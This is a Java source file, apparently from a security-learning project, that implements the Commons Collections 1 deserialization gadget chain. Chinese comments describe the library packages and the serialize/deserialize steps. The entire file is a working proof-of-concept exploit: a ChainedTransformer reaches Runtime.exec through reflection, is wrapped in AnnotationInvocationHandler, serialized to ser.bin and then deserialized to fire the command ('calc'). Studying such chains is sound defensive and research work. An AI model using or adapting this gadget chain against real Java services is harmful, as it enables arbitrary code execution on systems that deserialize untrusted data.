package com.drose.CC1;


//org.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类
//org.apache.commons.collections.bag – 实现Bag接口的一组类
//org.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类
//org.apache.commons.collections.buffer – 实现Buffer接口的一组类
//org.apache.commons.collections.collection –实现java.util.Collection接口的一组类
//org.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类
//org.apache.commons.collections.functors –Commons Collections自定义的一组功能类
//org.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类
//org.apache.commons.collections.keyvalue – 实现集合和键/值映射相关的一组类
//org.apache.commons.collections.list – 实现java.util.List接口的一组类
//org.apache.commons.collections.map – 实现Map系列接口的一组类
//org.apache.commons.collections.set – 实现Set系列接口的一组类

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class cc1 {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException, InstantiationException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod"
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec"
                        , new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value", "whatever");
        Map<Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //获取构造器
        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class, decorateMap);
        // 序列化反序列化
        serialize(o);
        unserialize("ser.bin");
    }
    //序列化反序列化
    public static void serialize(Object obj) throws IOException, FileNotFoundException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
